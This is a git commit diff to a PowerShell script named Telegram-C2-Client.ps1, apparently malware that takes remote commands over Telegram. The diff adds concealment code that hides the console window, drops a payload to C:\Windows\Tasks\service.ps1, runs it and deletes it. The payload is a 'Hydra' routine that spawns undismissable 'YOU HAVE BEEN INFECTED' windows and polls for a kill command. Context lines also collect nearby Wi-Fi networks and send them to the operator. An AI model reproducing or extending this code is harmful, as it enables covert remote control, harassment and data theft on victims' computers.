93a8034b96b92ff00e250d76a2a3bceb5a13c773
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-11-27 12:23:34 +0000

    Update Telegram-C2-Client.ps1

--- Telegram-C2-Client.ps1
+++ Telegram-C2-Client.ps1
@@ -160,13 +160,15 @@ sleep 5
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
 $Wifi = ($NearbyWifi|Out-String)
 $contents = "$wifi"
-Post-Message
+Post-Message | Out-Null
 }
 
 Function Send-Hydra {
+$tobat = @'
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 Add-Type -AssemblyName System.Windows.Forms
-$contents = "$comp $env:COMPUTERNAME $waiting Sent Hydra to User.."
-Post-Message
     function Create-Form {
         $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
         $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
@@ -178,14 +180,12 @@ Post-Message
         $form.StartPosition = 'Manual'
         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
         $result = $form.ShowDialog()
-    
-        $messages = Invoke-RestMethod -Uri $GHurl
+        $messages=ReceiveMSG
         if ($messages.message.text -contains "kill") {
             $contents = "$comp $env:COMPUTERNAME $closed Hydra Stopped!"
             Post-Message
             break
         }
-
         if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
             $form2 = Create-Form
             $form2.StartPosition = 'Manual'
@@ -195,6 +195,14 @@ Post-Message
         $random = (Get-Random -Minimum 0 -Maximum 2)
         Sleep $random
     }
+'@
+$pth = "C:\Windows\Tasks\service.ps1"
+$tobat | Out-File -FilePath $pth -Force
+& $pth
+Sleep 7
+rm -Path $pth
+$contents = "$comp $env:COMPUTERNAME $waiting Sent Hydra to User.."
+Post-Message
 }
 
 Function SpeechToText {
